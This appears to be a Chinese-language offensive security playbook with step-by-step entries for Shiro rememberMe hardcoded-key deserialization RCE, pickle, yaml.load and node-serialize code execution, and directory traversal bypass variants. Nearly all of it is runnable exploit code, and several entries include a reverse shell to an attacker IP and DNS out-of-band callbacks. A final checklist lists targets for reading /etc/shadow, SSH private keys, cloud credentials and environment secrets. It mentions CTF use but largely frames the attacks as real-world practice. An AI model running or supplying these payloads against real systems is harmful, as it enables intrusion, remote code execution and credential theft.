## [g-deser-java] Java 反序列化——ysoserial、Fastjson 与 Shiro

### [deser-java-shiro] Shiro rememberMe 硬编码密钥 | easy | Shiro;rememberMe;硬编码密钥 | -
> Shiro 用 AES 加密 rememberMe Cookie，密钥为公开硬编码值时，伪造序列化 payload 直达反序列化 RCE。

#### 这个条目的作用
Apache Shiro 的 RememberMe 功能把「已登录用户信息 + 随机密钥」序列化后 AES 加密，存进 `rememberMe` Cookie。老版本 Shiro（≤1.4.1）使用 AES-CBC 且默认密钥是公开硬编码值（如 `kPH+bIxk5D2deZiIxcaaaA==`），很多开发者也直接复用这套默认 key。我们只要拿到这个密钥，就能自己加密任意 Java 序列化 payload（配合 ysoserial gadget 链）伪造 Cookie，目标在反序列化时直接执行命令——这就是经典的 Shiro 550 / 反序列化 RCE。本条目教你从「看到一个登录框」到「爆破密钥 → 生成 payload → 加密 → 打进去」的完整链路。

#### 前置条件
- 目标站点使用了 Shiro（见第 1 步识别方法），且是 1.4.1 及以下版本（或配置上复用了公开/弱密钥）。
- 本机有 `java`（JDK 8 即可）和 `ysoserial.jar`（GitHub 下载），以及 Python3 环境（生成加密 Cookie）。
- 入口探测：先确认序列化入口真实存在（用 URLDNS 探测），再决定打哪条 gadget 链。

#### 第 1 步：识别 Shiro 与版本
登录失败后看响应头，或直接访问任意受保护页：
```bash
curl -s -i 'http://t/login' | grep -i 'set-cookie'
```
- 出现 `Set-Cookie: rememberMe=deleteMe; ...` 且请求带过 `rememberMe` Cookie → 确定是 Shiro。
- 出现 `JSESSIONID` 但没有 rememberMe → 后台可能没开 RememberMe，先看登录页有没有「记住我」勾选框并勾选后再登录一次。
- 版本判断：请求一个不存在的 Cookie 值 `Cookie: rememberMe=1`，响应 `deleteMe`；新版（1.4.2+）对非法值会报不同的错或直接不 set。能拿到报错堆栈时看版本号。

> [!tip] 若目标还给了 `rememberMe` 的合法 Cookie（登录后抓包），先解码看结构再爆破，能省一半时间。

#### 第 2 步：确认序列化入口（URLDNS 探测）
```bash
java -jar ysoserial.jar URLDNS "http://<你的id>.dnslog.cn" > probe.bin
python3 - <<'PY'
import base64, os
from Crypto.Cipher import AES

key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")   # 待爆破密钥
payload = open("probe.bin","rb").read()
pad = lambda s: s + (16 - len(s) % 16) * chr(16 - len(s) % 16)
iv = os.urandom(16)
cookie = base64.b64encode(iv + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(payload).encode("latin1"))).decode()
print(cookie)
PY
```
把输出的 Cookie 放进请求：
```bash
curl -s -b "rememberMe=<上面输出的串>" 'http://t/index'
```
dnslog 平台收到目标发来的 DNS 请求 → 该密钥正确、入口存在。没收到就换下一个密钥重跑第 2 步（爆破见第 3 步）。

#### 第 3 步：爆破硬编码密钥（不手动，用现成工具）
```bash
python3 shiro_tool.py -u http://t -k keys.txt   # 常见一键爆破工具
# 或逐 key 试：key 正确时 dnslog 回连 / 响应不再是 deleteMe
```
常用公开密钥放 `keys.txt`（每行一个，base64）：
```txt
kPH+bIxk5D2deZiIxcaaaA==
2AvVhdsgUs0FSA3SDFQag==
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
1QWLxg+NYmxraMoxAXu/Iw==
```
> [!warn] 响应出现 `Set-Cookie: rememberMe=deleteMe` 只代表「解密失败/密钥错误」，不代表漏洞不存在；密钥正确但链子不匹配时也可能静默失败，别急着下结论。

#### 第 4 步：生成命令执行 payload（ysoserial）
```bash
java -jar ysoserial.jar CommonsCollections6 "id" > cc6.bin
# 打不通换链：CommonsCollections5、CommonsBeanutils1、Shiro550 常用 CC6/CB1
# 无回显环境用出网命令确认：
java -jar ysoserial.jar CommonsCollections6 "ping <id>.dnslog.cn" > cc6.bin
```
> [!tip] Shiro 场景首选 `CommonsBeanutils1`（CB1）和 `CommonsCollections6`：Shiro 自带 commons-beanutils，CB1 兼容性最好，先试它。

#### 第 5 步：用密钥加密 Cookie（AES-CBC 格式）
Shiro rememberMe 的加密格式：`base64( IV(16字节) + AES-CBC(key, iv, payload) )`，padding 为 PKCS5。
```python
# shiro_cookie.py —— 完整可运行
import base64, os, sys
from Crypto.Cipher import AES

key = base64.b64decode(sys.argv[1])          # 第 3 步爆破出的密钥
payload = open(sys.argv[2], "rb").read()     # ysoserial 生成的 .bin
pad = lambda s: s + (16 - len(s) % 16) * chr(16 - len(s) % 16)
iv = os.urandom(16)
cipher = AES.new(key, AES.MODE_CBC, iv)
body = cipher.encrypt(pad(payload.decode("latin1")).encode("latin1"))
print(base64.b64encode(iv + body).decode())
```
```bash
python3 shiro_cookie.py 'kPH+bIxk5D2deZiIxcaaaA==' cc6.bin
```

#### 第 6 步：发送并验证
```bash
cookie=$(python3 shiro_cookie.py 'kPH+bIxk5D2deZiIxcaaaA==' cc6.bin)
curl -s -b "rememberMe=$cookie" 'http://t/index'
# 有回显（命令结果进响应）→ 直接看；无回显 → 看 dnslog 是否收到 ping
```
- 命令执行成功：`id` 输出或在 dnslog 看到回连。
- 失败诊断：响应 `deleteMe` → 密钥错或链子不匹配；无任何变化 → 入口可能没走反序列化，回第 2 步。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 一直 deleteMe | 密钥不对（爆破到的不是真 key） | 换更大密钥字典重新爆破，或用 URLDNS 逐个验证 |
| URLDNS 通但 CC6 无效果 | gadget 依赖不匹配 | 换 CB1 / CC5 / 其它链；Shiro 环境优先 CB1 |
| 命令无回显 | 站点无输出机制 | 改用 `ping <id>.dnslog.cn` 带外验证 |
| 报 `NoSuchMethodError`/ClassNotFound | 链依赖与目标版本不符 | 确认目标 Shiro/JDK 版本后换链 |
| 新版 Shiro 打不动 | 1.4.2+ 默认 AES-GCM + 随机密钥 | 确认版本；只能打开发者复用弱 key 的配置 |

#### 实战要点
- 先 URLDNS 确认入口，再上 RCE 链：入口不存在时所有链都是浪费。
- 密钥爆破不出不代表没洞：AuthRememberMeManager 之外还有 `rememberMe` 不加密的配置形态（明文序列化），试试直接 base64 发包。
- Cookie 判断口诀：登录页有「记住我」+ 响应 `rememberMe=deleteMe` = 高概率可打。
- dnslog 要选能区分「目标 IP」的平台，确认回连来自目标服务器而非自己。
- 打成功后优先把 id、`whoami` 结果留档，再考虑反弹 shell（出网则指定）。
- 报告里注明 Shiro 版本、爆破到的密钥、利用链（如 CC6/CB1），便于复现。

## [g-deser-py] Python/Node 反序列化——pickle、yaml 与 node-serialize

### [deser-py-pickle] pickle __reduce__ RCE | medium | 反序列化;Python;pickle | -
> pickle.loads 不可信数据即可任意代码执行，__reduce__ 让对象按可控参数重建。

#### 这个条目的作用
Python 的 `pickle` 在 `loads()` 恢复对象时，会按字节流里的指令「重建」任意对象——包括调用任意函数。只要程序用 `pickle.loads()` 处理了不可信输入（Cookie、上传的 `.pkl`/`.joblib` 模型、消息队列字节等），攻击者就可以用自定义类的 `__reduce__` 魔法方法，让重建过程去调用 `os.system`、`eval` 等危险函数，实现无条件的远程代码执行。本条目给你一份可以复制就能跑的 payload 生成器，以及判断入口、无回显打带外的完整套路。

#### 前置条件
- 目标有调用 `pickle.loads()` / `pickle.load()` 的入口，且输入可控（自研会话框架、模型上传、缓存反序列化等）。
- 本机能跑 Python3（生成 payload），最好能本地起一个同版本环境验证链。
- 理解 pickle 只应加载可信数据的原理（任何可控 loads 都等于直接给你一个 shell）。

#### 第 1 步：本地生成 payload（完整可运行模板）
```python
# gen_pickle_payload.py —— 直接复制运行
import pickle, base64, os

class RCE:
    def __reduce__(self):
        # 返回 (可调用对象, 参数元组)：重建对象时执行 os.system("id")
        return (os.system, ("id",))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```
```bash
python3 gen_pickle_payload.py
# 输出一串 base64，示例形如：gASV...（每次不同，属正常）
```

#### 第 2 步：本地自校验（确保 payload 没写错）
```bash
python3 -c "
import pickle, base64
pl = open('payload.txt').read().strip()   # 把上一步输出存进 payload.txt
pickle.loads(base64.b64decode(pl))        # 应打印出 id 命令结果
"
```
本地看到 `uid=...` 输出 → 模板正确；没输出先检查 `__reduce__` 是否写对（返回的是两个元素的元组）。

#### 第 3 步：投递到目标入口
按目标入口形态选择投递方式：
```bash
# 形态 A：参数直接传 pickle 字节（部分框架自动 base64 解码）
curl -s -d "data=$(cat payload.txt)" 'http://t/session'
# 形态 B：Cookie / header 里放 base64
curl -s -b "session=$(cat payload.txt)" 'http://t/'
# 形态 C：上传 .pkl / .joblib 模型文件（内容就是原始 pickle 字节，不 base64）
curl -s -F 'file=@model.pkl' 'http://t/ml/predict'
```
模型文件类入口要上传「原始 pickle 字节」而不是 base64：`pickle.dumps(RCE())` 直接写成文件即可。

#### 第 4 步：无回显时的变体与带外确认
```python
# 变体 1：反弹 shell（注意引号转义）
"bash -c 'bash -i >& /dev/tcp/你的IP/你的端口 0>&1'"

# 变体 2：不带 os 依赖，用 eval 起 exec（目标 import 受限时备用）
(eval, ("__import__('os').system('id')",))

# 变体 3：无回显打 DNS 带外（dnslog 平台生成 <id>）
(os.system, ("ping <id>.dnslog.cn",))

# 变体 4：把命令结果写进可访问文件，再做一次任意文件读取拿结果
(os.system, ("id > /tmp/r.txt",))
```
```python
# 生成时只需改 __reduce__ 返回值：
class RCE:
    def __reduce__(self):
        return (os.system, ("ping <id>.dnslog.cn",))
```
dnslog 收到回连 → 命令已执行。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 本地执行了但目标无反应 | 目标把输入 base64 前做了二次处理，或入口没走 pickle | 观察目标如何取参（解码几次），对齐编码方式 |
| 报 `UnpicklingError` | base64 串不完整/混入空白/编码错误 | 确认传的是完整 payload，去掉换行 |
| 报 `module ... not found` | 变体里 import 了目标没有的模块 | 只用 `os`/`eval` 等内置可靠路径 |
| 上传 .pkl 后无输出 | 目标用 `joblib`/`numpy` 加载且校验了类 | 换 `__reduce__` 返回内置函数；joblib 同样吃 pickle 协议 |
| 反弹 shell 没连上 | 端口没监听/出网被禁 | 先测 `ping` 带外确认出网，再上 shell |

#### 实战要点
- 优先本地验证 payload 再打目标：pickle 协议跨 Python 小版本基本兼容，但个别结构会翻车。
- 入口观察顺序：Cookie/session 的参数名 → 上传模型/缓存文件 → 消息队列/异步任务反序列化。
- 拿到 RCE 后别急着搞花活，先 `id`、`/etc/passwd`、`/proc/self/environ` 三件套留档。
- 反弹 shell 优先 `bash -c` 写法并做好引号转义；被过滤时试 base64 编码命令再解。
- pickle 是「协议级」漏洞：任何 `pickle.loads` 可控输入都等于直接 RCE，不要受「只是个会话解析」迷惑。

### [deser-py-yaml-node] yaml.load 与 node-serialize | medium | yaml;node-serialize;反序列化 | -
> Python yaml.load 可实例化任意类，Node 的 node-serialize 把函数字符串直接 eval。

#### 这个条目的作用
两类「看着像配置解析、实际是反序列化」的高危入口：Python 的 `yaml.load()` 在非安全 Loader 下可以实例化任意 Python 类并调用函数；Node 的 `node-serialize` 库（以及同类把对象方法当字符串存的库）会把 `_$$ND_FUNC$$_` 标记的函数字符串直接 `eval`。它们都伪装成「读个配置/解个对象」，实则等于可控任意代码执行。本条目给出可复制的 YAML payload、node-serialize 利用串，以及识别入口与验证的方法。

#### 前置条件
- Python 侧：确认目标用 `yaml.load()` 且 Loader 不是默认安全 Loader（PyYAML 5.1+ 裸调用默认 `SafeLoader`，需显式 `UnsafeLoader`/`FullLoader` 才可打）。
- Node 侧：确认目标依赖里有 `node-serialize`（`package.json` 或报错栈里能看见），且用 `serialize.unserialize()` 处理了不可信输入。
- 本机有 python3 与 node 任一即可本地验证对应 payload。

#### 第 1 步：Python yaml.load 命令执行 payload
```yaml
# p.yml —— 直接执行命令（无回显输出到标准输出）
!!python/object/apply:os.system ["id"]

# 变体：拿命令输出（eval + popen 读回）
!!python/object/apply:eval ["__import__('os').popen('cat /etc/passwd').read()"]
```
```bash
# 目标端触发（UnsafeLoader 才危险；FullLoader 对部分结构同样可打）
python3 -c "import yaml; yaml.load(open('p.yml'), Loader=yaml.UnsafeLoader)"
```

#### 第 2 步：确认目标 Loader 是否可打
```bash
# 用报错差异判断：SafeLoader 解析 !!python 标签会直接抛 ConstructorError
curl -s -d 'payload=!!python/object/apply:os.system ["id"]' 'http://t/cfg'
# 响应含 ConstructorError / 参数以 yaml 解析 → 可打
# 响应 200 且无报错 → 可能走了 UnsafeLoader，继续验证回显
```
> [!warn] PyYAML 5.1+ 的裸 `yaml.load()` 默认安全 Loader；只有代码里显式用了 `UnsafeLoader`/`FullLoader`（或老版本 PyYAML）才构成漏洞，先找目标代码/特征再构造，别瞎打。

#### 第 3 步：node-serialize 命令执行 payload
```javascript
// 目标代码等价于：
// var serialize = require('node-serialize');
// serialize.unserialize(userInput)   ← 会 eval `_$$ND_FUNC$$_` 标记串

// 本地生成 payload（Node 环境执行一次即可得到目标入参）
var payload = '{"rce":"_$$ND_FUNC$$_function(){return require("child_process").exec("id",function(e,s){console.log(s)})}()"}';
console.log(payload);
```
投递：
```bash
curl -s -d "data=%7B%22rce%22%3A%22_%24%24ND_FUNC%24%24_function()%7Breturn%20require('child_process').exec('id',function(e%2Cs)%7Bconsole.log(s)%7D)%7D()%22%7D" 'http://t/deser'
```
要点：`_$$ND_FUNC$$_` 开头声明「这是函数体」，末尾紧跟 `()` 使其立即执行；Node 原生 `JSON.parse` 不会执行代码，只有这类库才会。

#### 第 4 步：变体与升级
```javascript
// 反弹 shell 版本（Node）
'{"rce":"_$$ND_FUNC$$_function(){return require("child_process").exec("bash -c \'bash -i >& /dev/tcp/IP/PORT 0>&1\'",function(e,s){console.log(s)})}()"}'

// 无回显打带外
'{"rce":"_$$ND_FUNC$$_function(){return require("child_process").exec("ping <id>.dnslog.cn",function(e,s){})}()"}'
```
Python YAML 侧同理换 `os.system` 参数即可。

> [!tip] 顺带测 JSON 深合并/原型污染入口（`merge`/`assign` 类函数），配合 `child_process` 可升级为 RCE；但先确认目标依赖里真有这类函数，别把原生 `JSON.parse` 当漏洞。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| yaml payload 报 ConstructorError | 目标用了 SafeLoader / 高版本 PyYAML | 确认代码用 UnsafeLoader 再打；否则此入口不可用 |
| yaml 命令执行了但没回显 | os.system 输出进不了响应 | 用 eval+popen 变体读回，或写文件+任意文件读 |
| node-serialize 无反应 | 目标没这依赖 / 参数名不对 | 看 error log 或报错栈里有没有 node-serialize 字样 |
| 原型污染升级失败 | merge 用的是白名单库 | 回到 `__proto__` 常规利用面，别死磕 RCE |
| 引号转义混乱 | JS 字符串嵌套层数多 | 用模板：外层单引号 → 内层双引号 → 命令再换 `\'` |

#### 实战要点
- 先确认库/依赖再构造 payload，YAML 与 node-serialize 都是「确认存在才成立」的漏洞，别盲目爆破。
- yaml 优先 `!!python/object/apply:eval ["__import__('os').popen(...).read()"]` 拿回显；无回显再打带外。
- node-serialize 的 `_$$ND_FUNC$$_` 标记 + 末尾 `()` 是铁律，少一个都不执行。
- 两处都遵循「本地先验」：yaml 用本机 python3 测，node 用本机 node 测，通了再打目标。
- 打进来后同 pickle 一样，先留 `id`/环境变量档，再考虑反弹 shell。

## [g-traversal] 目录遍历——../ 变体、下载参数与目标文件清单

### [traversal-variants] ../ 变体全集 | easy | 目录遍历;编码绕过;路径穿越 | -
> 过滤 ../ 时用编码、双写、绝对路径等变体绕过，目标是文件读取/包含函数。

#### 这个条目的作用
目录遍历（路径穿越）的核心问题是：服务端把用户输入拼进文件路径，却对 `../` 做了过滤。过滤方式五花八门——替换为空、删除 `../`、白名单前缀、只挡一次等等。本条目给你一张「变体全集表 + 判断过滤逻辑的方法」，让你在第一个 payload 被拦后能顺着换编码、双写、绝对路径、Windows 变体一路试下去，直到触达 `/etc/passwd`。

#### 前置条件
- 找到一个会把参数拼进文件路径的功能点（下载、图片预览、语言切换、主题加载、日志查看等），参数名常见 `file=`/`path=`/`page=`/`name=`。
- 先用无过滤姿势确认基础遍历存在（第 1 步），再考虑绕过。
- 本机 curl 即可，Windows 目标场景准备 `..\` 变体。

#### 第 1 步：确认基础遍历与过滤行为
```bash
curl --path-as-is 'http://t/download?file=../../../../etc/passwd'
```
- 读到 passwd → 无过滤，直接打。
- 被拦/报错 → 判过滤类型：再发一个测试串看响应差异。
```bash
curl --path-as-is 'http://t/download?file=....//....//etc/passwd'   # 双写
curl --path-as-is 'http://t/download?file=..%2f..%2fetc%2fpasswd'   # 编码
curl --path-as-is 'http://t/download?file=/etc/passwd'              # 绝对路径
```

#### 第 2 步：判断过滤是「替换」还是「删除」
用一个可观察结果的测试判断递归与否：
```bash
# 若把 "../" 替换为空：....// 会被掏成 ..//
curl --path-as-is 'http://t/download?file=....//....//etc/passwd'
# 若只删一次且不递归：上面可能直接读到 passwd（替换后仍含 ..）
# 若过滤有白名单前缀拼路径：直接试绝对路径 /etc/passwd
```
> [!tip] 优先试「整体 URL 编码一次再发」：`../../` 的 `..` 用 `%2e%2e/` 常能过「只匹配字面 ../」的正则。

#### 第 3 步：变体全集逐个试
| 变体 | 示例 | 场景 |
| --- | --- | --- |
| 基础 ../ | `../../../../etc/passwd` | 无过滤 |
| URL 编码 | `%2e%2e%2f`、`..%2f`、`%2e%2e/` | 服务端解码一次 |
| 双编码 | `%252e%252e%252f` | 服务端解码两次（如 Nginx 一层 + 应用一层） |
| 双写 | `....//`、`..%2f..%2f` | 过滤「把 ../ 替换为空」 |
| 绝对路径 | `/etc/passwd` | 拼接型直接覆盖相对路径 |
| 截断替换 | `....//....//etc/passwd` | 过滤递归替换 `../` 为空的错觉 |
| Windows | `..\\..\\`、`..;/`（IIS） | 目标为 Windows |
| null 截断 | `../../etc/passwd%00.png` | 自动拼接扩展名（老平台，PHP<5.3.4/Tomcat 老版） |
```bash
# 编码变体速查（etc/passwd 的相对路径编码）
curl --path-as-is 'http://t/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd'
curl --path-as-is 'http://t/download?file=..%252f..%252f..%252fetc/passwd'
```

#### 第 4 步：层级与拼接适配
- 层级不够就多加 `../`（从服务器 Web 根往上，通常 3-6 层够到根）：
```bash
for i in 1 2 3 4 5 6 7; do
  dots=$(printf '../%.0s' $(seq 1 $i))
  curl --path-as-is -s -o /dev/null -w "%{http_code} $i\n" \
    "http://t/download?file=${dots}etc/passwd"
done
```
- 白名单校验（realpath 必须落在某目录内）：先传正常相对路径 `?file=1.txt` 观察拼接规则，再反推穿越写法；有时 `/proc/self/root/etc/passwd`、`/proc/self/cwd/...` 能绕过 realpath 检查。

> [!warn] `%00` 截断在现代 Web 栈基本无效，只在老版本 Tomcat/IIS/PHP<5.3.4 碰运气，别浪费太多请求。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| curl 结果里 `..` 消失 | curl 自动规范化路径 | 加 `--path-as-is` |
| 所有变体都 404/403 | 过滤是白名单且返回 404 伪装 | 试绝对路径、试 /proc 系路径、测正常文件确认拼接 |
| 编码后仍被拦 | 只挡了带编码的，没挡双写 | 组合编码+双写：`%2e%2e%2f%2e%2e%2f` 与 `....//` 混用 |
| 读到但内容是空 | 自动拼了扩展名/错误层级 | 试 `%00` 截断（老平台）或读无扩展名文件（`/etc/passwd` 无后缀） |
| Windows 目标全失败 | 分隔符是 `\` | 换 `..\\..\\`、URL 编码 `%5c`、`..;/`（IIS 解析特性） |

#### 实战要点
- 变体有组合性：「编码+双写」「编码+绝对路径」「大小写路径」叠加着试，单变体失败别停。
- 过滤逻辑判断优先：先看是替换为空还是拒绝，再看是否递归，选对应变体，别盲目扫表。
- `--path-as-is` 是事实标准，所有带 `..` 的 curl 都要带。
- 读到 `/etc/passwd` 只是起点，按 traversal-targets 清单扩散到配置、密钥、源码。
- 同一接口多参数都试一遍：`file`、`path`、`name`、`src`、`url`（下载接口常见多个可控字段）。

### [traversal-download] 下载型 filename 参数挖掘 | easy | 任意文件读取;参数挖掘;下载 | -
> 下载/导出接口的 filename/path 参数是任意文件读取高发点，先找参数形态再枚举目标。

#### 这个条目的作用
业务里的「下载」「导出」「附件预览」功能是任意文件读取的重灾区：开发者习惯把文件名直接拼进路径，且不太加校验。这类接口参数形态多样（直接路径、base64、JSON 字段、加密串），本条目教你系统性地挖参数——先确认参数形态，再套 traversal 变体，最后枚举高价值文件。

#### 前置条件
- 找到一个带参数触发的下载/导出/预览功能（前端能看到下载链接最好，直接抓包拿参数名）。
- 已理解 ../ 变体（见 traversal-variants），本条目侧重「参数在哪、长什么样」。
- 浏览器 F12/抓包工具（Burp 或浏览器开发者工具复现请求）。

#### 第 1 步：定位下载参数的形态
打开浏览器开发者工具，触发一次正常下载，看请求长什么样：
- 直接路径：`/download?file=report.pdf` → 直接套 `../`
- 数字 id：`/download?id=1024` → 大概率查库，不是文件路径漏洞，看有无路径拼接附件
- base64：`/file?f=cmVwb3J0LnBkZg==` → 先解码再穿越
- JSON 体：`POST {"path":"report.pdf"}` → 改 JSON 里的 path
- 加密/签名串：先找明文对应关系，能解则解，不能解跳过

```bash
# 抓到的原始请求解码验证
echo 'Li4vLi4vLi4vZXRjL3Bhc3N3ZA==' | base64 -d   # -> ../../../etc/passwd
```

#### 第 2 步：套用 traversal 变体逐个参数试
```bash
# 直接路径形态
curl --path-as-is 'http://t/download?file=../../../../etc/passwd'
# base64 形态：把穿越路径 base64 后放进参数
curl --path-as-is 'http://t/download?f=Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA=='
# JSON 形态
curl -s -H 'Content-Type: application/json' -d '{"path":"../../../../etc/passwd"}' 'http://t/export'
```
> [!tip] 先测一个正常文件确认拼接规则（`?file=1.txt` 返回什么、相对哪个目录），再决定加几层 `../`，别上来就 7 层。

#### 第 3 步：高发入口清单逐个过
- `/download?filename=`、`/file?path=`、`/export?name=`
- 附件：`/attachments?f=`、`/upload/download?id=`
- 后台功能：备份下载、日志查看、报表导出、模板下载、头像预览
- 语言/主题：`?lang=zh_CN`、`?theme=default` 拼路径读取
```bash
# 快速枚举一批入口（同站点不同路径都试）
for u in \
  "http://t/download?filename=../../../../etc/passwd" \
  "http://t/file?path=../../../../etc/passwd" \
  "http://t/export?name=../../../../etc/passwd" \
  "http://t/attachments?f=../../../../etc/passwd" ; do
  curl --path-as-is -s -o /dev/null -w "%{http_code} $u\n" "$u"
done
```

#### 第 4 步：绕过白名单与拼接扩展名
- 白名单 realpath：`/proc/self/root/etc/passwd` 绕过相对目录限制；或先正常文件确认 base 目录再穿越。
- 自动补后缀：`../../etc/passwd%00.pdf`（老平台）；现代平台探测是否补充（返回 404 换无扩展名目标如 `/proc/self/environ`）。
- 编码再降权：参数整体 URL 编码一次/两次、`..\` Windows 变体、`....//` 双写轮着来。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| base64 参数解码后是乱码 | 参数可能不是 base64 而是 hex/自定义编码 | 观察正常值格式（是否以 = 结尾、长度规律）再对齐 |
| 数字 id 参数没用 | 走数据库查询而非文件路径 | 放弃该参数，找附件/文件型参数 |
| 返回 200 但内容为空 | 拼接了扩展名或目录不对 | 换无扩展名文件；试 `%00`（老平台）|
| 预览接口正常、下载接口不行 | 两个接口实现不同 | 预览/缩略图接口也测（thumbnail 常直接拼路径）|
| 一直 404 | 层级不够或 base 目录深 | 用第 2 步的循环加层数，最多试到 7 层 |

#### 实战要点
- 「下载」与「预览/缩略图」常是两个实现，后者往往没校验，全部测一遍。
- 参数形态决定打法：直接路径走变体表，base64 先解码还原再穿越后重新编码。
- 后台功能（日志/备份/报表导出）校验最松，优先找后台下载点。
- 成功读第一个文件后立刻确认编码规则（原样/解码/拼接），后面批量枚举白名单目标。
- 一次性组合多用：同一请求里 file 和 path 都传穿越值，看哪个生效。

### [traversal-targets] 读取目标清单 | easy | 任意文件读取;信息收集;敏感文件 | -
> 任意文件读取到手后按优先级扩散：账户、密钥、配置、运行信息。

#### 这个条目的作用
任意文件读取（任意文件读取）拿到手只是第一步——漏洞价值取决于你能读到什么。CTF 里是 flag，实战里是数据库密码、云凭证、源码备份。本条目给你一张按价值排序的读取清单与探测组合：先拿 flag 得分，再拿环境变量、配置文件、源码、密钥，逐级扩散攻击面。

#### 前置条件
- 已确认一个可用的任意文件读取点（任意参数 + 变体可用，见 traversal-variants/download）。
- 知道目标操作系统形态（Linux 大概率；Windows 见清单末尾）。
- 准备脚本循环批量探测，省去逐个手敲。

#### 第 1 步：直接得分优先——flag 三连
```bash
curl --path-as-is -s 'http://t/download?file=../../../../flag'
curl --path-as-is -s 'http://t/download?file=../../../../flag.txt'
curl --path-as-is -s 'http://t/download?file=../../../../root/flag'
```
CTF 靶机 flag 常见于 `/flag`、`/flag.txt`、`/root/flag`、`/app/flag`、`/home/ctf/flag`。读到内容形如 `flag{...}` 即得分。

#### 第 2 步：环境变量与进程信息（信息密度最高）
```bash
curl --path-as-is -s 'http://t/download?file=../../../../proc/self/environ'
curl --path-as-is -s 'http://t/download?file=../../../../proc/self/cmdline'
curl --path-as-is -s 'http://t/download?file=../../../../proc/self/status'
```
- `/proc/self/environ`：一次读全环境变量，数据库口令、API Key、FLAG 常在这里。
- `/proc/self/cmdline`：启动参数（含配置路径、密码参数）。
- `/proc/self/status`：当前进程用户（`Uid:` 行判 root）。

#### 第 3 步：账户与 Web 配置
```bash
curl --path-as-is -s 'http://t/download?file=../../../../etc/passwd'
curl --path-as-is -s 'http://t/download?file=../../../../etc/shadow'
# Web 配置（按语言猜路径）
curl --path-as-is -s 'http://t/download?file=../../../../app/config.php'
curl --path-as-is -s 'http://t/download?file=../../../../app/application.yml'
curl --path-as-is -s 'http://t/download?file=../../../../WEB-INF/web.xml'
```
- `/etc/passwd` 判用户列表；`/etc/shadow` 只在万不得已读（涉及密码哈希，报告脱敏）。
- 配置文件里找：数据库 host/user/pass、Redis 密码、JWT 密钥（可伪造 token）、OSS/AWS secret。

#### 第 4 步：源码、git 与密钥
```bash
curl --path-as-is -s 'http://t/download?file=../../../../app/.git/config'
curl --path-as-is -s 'http://t/download?file=../../../../app/.git/HEAD'
curl --path-as-is -s 'http://t/download?file=../../../../root/.ssh/id_rsa'
curl --path-as-is -s 'http://t/download?file=../../../../home/www/.ssh/id_rsa'
curl --path-as-is -s 'http://t/download?file=../../../../root/.aws/credentials'
```
- `.git/config` + HEAD → 拿到 git 后可 dump 源码（git-dumper 类工具）二次审计。
- SSH 私钥可用于横向移动（注意：私钥是敏感数据，报告只写存在性）。
- 云凭证 `~/.aws/credentials`、`/root/.aliyun` 等指向云资产接管。

#### 第 5 步：Windows 目标清单
```bash
curl --path-as-is -s 'http://t/download?file=..\..\..\..\Windows\win.ini'
curl --path-as-is -s 'http://t/download?file=..\..\..\..\inetpub\wwwroot\web.config'
curl --path-as-is -s 'http://t/download?file=..\..\..\..\Windows\System32\drivers\etc\hosts'
```
Windows 用 `..\`、`%5c`、`..;/`（IIS）；`web.config` 里常见连接字符串明文密码。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| flag 路径读不到 | flag 名字/位置不标准 | `find` 不了就枚举：`/flag`、`/flag.txt`、`/root/flag`、`/app/flag*` |
| environ 读到一半 | 环境变量大/含 null | 读 `cmdline`、`status` 补充进程信息 |
| 配置文件读不到 | Web 根目录位置不确定 | 先读 `cmdline`/`environ` 反推路径再构造 |
| 权限不足（读 shadow 403） | 非 root 进程 | 换读 `/proc/self/environ`、用户家目录配置文件 |
| Windows 全 404 | 分隔符/斜杠方向问题 | 试 `%5c` 编码与 `..;/` IIS 变体 |

#### 实战要点
- 优先级铁律：flag（得分）→ 环境变量（密钥密度）→ 配置（凭证）→ 源码/git（二次攻击面）→ SSH/云凭证（横向）。
- 一个点读成功就批量脚本化枚举，别手敲：10 个目标文件写循环一次跑完。
- 读到的密码/凭证属于敏感数据，报告只写「文件存在+位置+脱敏前缀」，严禁全文贴出。
- flag 关键词多试大小写与位置变体：`flag`、`Flag`、`FLAG`、`/flag`、`/flag.txt`、`/root/flag`。
- 无扩展名文件（`environ`、`passwd`、`.git/config`）能绕过「自动补后缀」型校验，优先用。